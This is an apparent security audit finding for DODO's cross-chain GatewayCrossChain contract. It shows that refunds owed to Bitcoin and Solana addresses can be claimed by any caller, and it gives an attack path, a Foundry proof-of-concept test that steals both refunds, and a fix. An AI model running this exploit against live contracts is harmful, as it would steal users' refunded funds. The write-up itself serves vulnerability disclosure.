# Arbitrary users can steal refunds intended for non-EVM chain addresses

### Summary

https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571-L590

The missing validation of non-EVM wallet addresses in `GatewayCrossChain.sol` will cause a complete loss of funds for Bitcoin and Solana users as any attacker can claim refunds intended for these non-EVM chain addresses by frontrunning the protocol's refund bots.

### Root Cause

In `GatewayCrossChain.sol:575-577` there is an improper address validation:

```solidity
if(refundInfo.walletAddress.length == 20) {
    receiver = address(uint160(bytes20(refundInfo.walletAddress)));
}
```

This check only properly validates Ethereum (EVM) addresses which are exactly 20 bytes long. For non-EVM addresses (Bitcoin, Solana), this condition fails, resulting in `receiver` remaining set to `msg.sender`. Subsequently, any caller who knows a valid `externalId` can pass the authorization check `bots[msg.sender] || msg.sender == receiver` and claim the refund.

While the protocol team states "If the receiver of refund info is not an EOA address, refund bots collect the tokens and process the refund manually," this only applies to EVM addresses. For non-EVM addresses, the vulnerability still allows arbitrary users to claim refunds by frontrunning the protocol's refund bots.

### Internal Pre-conditions

1. A cross-chain transaction from or to a non-EVM chain (Bitcoin or Solana) must be reverted
2. The refund must be stored in the `refundInfos` mapping with a non-EVM wallet address format (not 20 bytes)
3. The attacker must know the `externalId` of a valid refund (can be obtained by monitoring `EddyCrossChainRefund` events)

### Attack Path

1. Attacker monitors the blockchain for `EddyCrossChainRefund` events that include non-EVM addresses (Bitcoin, Solana)
2. When a refund for a non-EVM address is created, the attacker extracts the `externalId` from the event
3. Attacker immediately calls `claimRefund(externalId)` with a high gas price to frontrun any protocol refund bots
4. Since `refundInfo.walletAddress.length != 20` for non-EVM addresses, `receiver` remains set to `msg.sender`
5. The authorization check `bots[msg.sender] || msg.sender == receiver` passes since `msg.sender == receiver`
6. The attacker successfully receives the refund tokens that were meant for the original non-EVM address owner
7. The legitimate recipient cannot claim their refund as it has already been claimed

### Impact

Users of non-EVM chains (Bitcoin, Solana) suffer a complete loss of refunded tokens during cross-chain transactions. The attacker gains the full value of these refunds by frontrunning the protocol's refund bots. This impacts a significant portion of the protocol's cross-chain functionality, as ZetaChain is specifically designed to facilitate transactions between EVM and non-EVM chains.

### PoC

Add the following test case in `GatewayCrossChain.t.sol`.

```solidity
function test_VulnerableNonEVMRefundClaim() public {
    // Create two users - victim and attacker
    address victim = address(0x444);
    address attacker = address(0x555);
    
    // Set up test amounts
    uint256 amount = 10 ether;
    token1Z.mint(address(gatewayCrossChain), amount * 2);
    
    // =========== SCENARIO 1: BITCOIN REFUND THEFT ===========
    // Step 1: A Bitcoin transaction is reverted, creating a refund entry with Bitcoin address format
    bytes32 btcExternalId = keccak256(abi.encodePacked("btc-revert-tx"));
    
    // Simulate a revert for a Bitcoin transaction
    vm.prank(address(gatewayZEVM));
    gatewayCrossChain.onRevert(
        RevertContext({
            sender: address(0),
            asset: address(token1Z),
            amount: amount,
            // Note: Bitcoin addresses are not 20 bytes, here we use the full format from BaseTest
            revertMessage: bytes.concat(btcExternalId, btcAddress)
        })
    );
    
    // Verify the refund info exists for the Bitcoin address
    (bytes32 storedBtcId, address storedBtcToken, uint256 storedBtcAmount, ) = gatewayCrossChain.refundInfos(btcExternalId);
    assertEq(storedBtcId, btcExternalId);
    assertEq(storedBtcToken, address(token1Z));
    assertEq(storedBtcAmount, amount);
    
    // Step 2: Attacker claims the BTC refund even though they are not the intended recipient
    vm.prank(attacker);
    gatewayCrossChain.claimRefund(btcExternalId);
    
    // Verify the attacker received the funds
    assertEq(token1Z.balanceOf(attacker), amount);
    
    // =========== SCENARIO 2: SOLANA REFUND THEFT ===========
    // Step 1: A Solana transaction is reverted, creating a refund entry with Solana address format
    bytes32 solExternalId = keccak256(abi.encodePacked("sol-revert-tx"));
    
    // Simulate a revert for a Solana transaction
    vm.prank(address(gatewayZEVM));
    gatewayCrossChain.onRevert(
        RevertContext({
            sender: address(0),
            asset: address(token1Z),
            amount: amount,
            // Note: Solana addresses are 32 bytes
            revertMessage: bytes.concat(solExternalId, solAddress)
        })
    );
    
    // Verify the refund info exists for the Solana address
    (bytes32 storedSolId, address storedSolToken, uint256 storedSolAmount, ) = gatewayCrossChain.refundInfos(solExternalId);
    assertEq(storedSolId, solExternalId);
    assertEq(storedSolToken, address(token1Z));
    assertEq(storedSolAmount, amount);
    
    // Step 3: Attacker claims the Solana refund even though they are not the intended recipient
    vm.prank(attacker);
    gatewayCrossChain.claimRefund(solExternalId);
    
    // Verify the attacker now received both refunds
    assertEq(token1Z.balanceOf(attacker), amount * 2);
    
    // =========== PROVE THE INTENDED RECIPIENTS CANNOT CLAIM ===========
    // Try to claim as the intended Bitcoin recipient (should fail or do nothing since refund is already claimed)
    vm.prank(victim);
    // This should fail because the refund has been claimed already
    vm.expectRevert();
    gatewayCrossChain.claimRefund(btcExternalId);
}
```

Run the test with `forge test --fork-url https://zetachain-mainnet.public.blastapi.io --match-test test_VulnerableNonEVMRefundClaim`.

### Mitigation

Modify the `claimRefund` function to improve address validation for non-EVM chains:

1. Implement chain-specific address validation for Bitcoin and Solana addresses
2. Maintain a mapping of `externalId` to authorized claimer addresses
3. For non-EVM refunds, only allow authorized bots to claim the refund

```solidity
function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];
    require(refundInfo.externalId != "", "REFUND_NOT_EXIST");
    
    // For EVM addresses (20 bytes), allow the address or bots to claim
    if(refundInfo.walletAddress.length == 20) {
        address receiver = address(uint160(bytes20(refundInfo.walletAddress)));
        require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
        TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);
    } 
    // For non-EVM addresses, only allow bots to claim
    else {
        require(bots[msg.sender], "ONLY_BOTS_FOR_NON_EVM");
        // Bots can process the refund according to protocol's manual process
        TransferHelper.safeTransfer(refundInfo.token, msg.sender, refundInfo.amount);
    }
    
    delete refundInfos[externalId];
    
    emit EddyCrossChainRefundClaimed(
        externalId,
        refundInfo.token,
        refundInfo.amount,
        abi.encodePacked(msg.sender)
    );
}
```
